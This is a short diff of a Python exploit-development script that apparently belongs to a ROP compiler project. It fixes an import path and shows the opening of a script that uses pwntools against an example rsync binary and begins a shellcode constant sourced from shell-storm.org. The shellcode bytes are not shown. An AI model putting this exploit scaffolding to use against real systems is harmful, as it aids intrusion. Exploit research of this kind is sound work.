@@ -1,6 +1,6 @@
 import sys, logging, binascii
 from pwn import *
-import ropme, goal
+from rop_compiler import ropme, goal
 
 filename = './example/rsync'
 shellcode = ( # http://shell-storm.org/shellcode/files/shellcode-603.php
